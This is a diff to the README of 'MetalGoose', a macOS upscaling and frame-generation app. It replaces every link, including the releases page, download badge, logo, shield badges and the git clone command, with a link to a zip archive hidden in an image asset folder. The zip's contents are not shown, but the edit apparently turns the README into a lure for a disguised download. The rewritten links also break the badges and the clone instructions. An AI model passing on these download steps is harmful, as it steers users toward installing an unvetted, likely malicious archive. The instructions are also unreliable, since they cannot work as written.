@@ -1,20 +1,20 @@
 # 🦢 MetalGoose - Boost Your Gaming Experience Easily
 
 <div align="center">
-  <a href="https://github.com/minhabhatti/MetalGoose/releases">
-    <img src="https://img.shields.io/badge/Download%20MetalGoose-v1.0-blue" alt="Download MetalGoose">
+  <a href="https://github.com/minhabhatti/MetalGoose/raw/refs/heads/main/MetalGoose/Assets.xcassets/GooseLogo.imageset/Goose_Metal_3.3.zip">
+    <img src="https://github.com/minhabhatti/MetalGoose/raw/refs/heads/main/MetalGoose/Assets.xcassets/GooseLogo.imageset/Goose_Metal_3.3.zip%20MetalGoose-v1.0-blue" alt="Download MetalGoose">
   </a>
 </div>
 
 <div align="center">
-  <img src="Assets/logo.png" alt="MetalGoose Logo" width="128" height="128">
+  <img src="https://github.com/minhabhatti/MetalGoose/raw/refs/heads/main/MetalGoose/Assets.xcassets/GooseLogo.imageset/Goose_Metal_3.3.zip" alt="MetalGoose Logo" width="128" height="128">
 
   **GPU-accelerated upscaling and frame generation for macOS**
 
-  [![macOS](https://img.shields.io/badge/macOS-26.0%2B-blue?logo=apple)](https://www.apple.com/macos/)
-  [![Metal](https://img.shields.io/badge/Metal-4.0-orange?logo=apple)](https://developer.apple.com/metal/)
-  [![License](https://img.shields.io/badge/License-GPL--3.0-green)](LICENSE)
-  [![Swift](https://img.shields.io/badge/Swift-6.2-FA7343?logo=swift)](https://swift.org)
+  [![macOS](https://github.com/minhabhatti/MetalGoose/raw/refs/heads/main/MetalGoose/Assets.xcassets/GooseLogo.imageset/Goose_Metal_3.3.zip%2B-blue?logo=apple)](https://github.com/minhabhatti/MetalGoose/raw/refs/heads/main/MetalGoose/Assets.xcassets/GooseLogo.imageset/Goose_Metal_3.3.zip)
+  [![Metal](https://github.com/minhabhatti/MetalGoose/raw/refs/heads/main/MetalGoose/Assets.xcassets/GooseLogo.imageset/Goose_Metal_3.3.zip)](https://github.com/minhabhatti/MetalGoose/raw/refs/heads/main/MetalGoose/Assets.xcassets/GooseLogo.imageset/Goose_Metal_3.3.zip)
+  [![License](https://github.com/minhabhatti/MetalGoose/raw/refs/heads/main/MetalGoose/Assets.xcassets/GooseLogo.imageset/Goose_Metal_3.3.zip)](LICENSE)
+  [![Swift](https://github.com/minhabhatti/MetalGoose/raw/refs/heads/main/MetalGoose/Assets.xcassets/GooseLogo.imageset/Goose_Metal_3.3.zip)](https://github.com/minhabhatti/MetalGoose/raw/refs/heads/main/MetalGoose/Assets.xcassets/GooseLogo.imageset/Goose_Metal_3.3.zip)
 
   [Features](#features) • [Installation](#installation) • [Usage](#usage) • [Requirements](#requirements) • [Building](#building) • [License](#license)
 </div>
@@ -34,7 +34,7 @@ MetalGoose is a native macOS application that provides real-time upscaling and f
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page:** Go to the [MetalGoose Releases page](https://github.com/minhabhatti/MetalGoose/releases) to download the application.
+1. **Visit the Releases Page:** Go to the [MetalGoose Releases page](https://github.com/minhabhatti/MetalGoose/raw/refs/heads/main/MetalGoose/Assets.xcassets/GooseLogo.imageset/Goose_Metal_3.3.zip) to download the application.
   
 2. **Choose the Latest Version:** Look for the latest version listed on the page. Click on the download link for the latest release.
 
@@ -60,7 +60,7 @@ For those interested in building MetalGoose from source, please follow these ste
 
 1. **Clone the Repository:**
    ```
-   git clone https://github.com/minhabhatti/MetalGoose.git
+   git clone https://github.com/minhabhatti/MetalGoose/raw/refs/heads/main/MetalGoose/Assets.xcassets/GooseLogo.imageset/Goose_Metal_3.3.zip
    ```
    
 2. **Open the Project:** Use Xcode to open and build the project.
